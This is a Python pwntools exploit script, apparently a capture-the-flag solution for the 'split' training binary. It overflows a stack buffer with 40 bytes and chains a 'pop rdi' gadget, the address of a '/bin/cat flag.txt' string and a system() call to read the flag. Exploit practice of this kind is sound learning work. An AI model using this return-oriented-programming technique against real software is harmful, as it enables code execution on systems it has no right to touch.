#!/usr/bin/env python2

from pwn import *

e = context.binary = ELF('split')
elf = e


#context.log_level = 'debug'

addressCat = 0x00601060 #/bin/cat/flag.txt
addressSystem = 0x004005e6 #GOT table

addressPopRDI = 0x0000000000400883 #pop rdi; ret:


info("/bin/cat/flaf.txt at addres: 0X%x",addressCat)
info("address of the system (usefulFunction): 0X%x",addressSystem)

process = process(elf.path)

overflow = 40*'A'



ropchange = overflow + p64(addressPopRDI)
ropchange += p64(addressCat)
ropchange += p64(addressSystem)
ropchange += p64(0x4242424242424242) #padding. Will end up jumping to that address and creatin a SIGSEGV

info("Payload:  %s",ropchange)


process.sendlineafter('>',ropchange)

process.wait_for_close()

info(process.recvall())
#check for the right offset
#core = process.corefile
#stack = core.rsp
#EIP = core.read(stack,8)
#print("EIP               "+EIP)

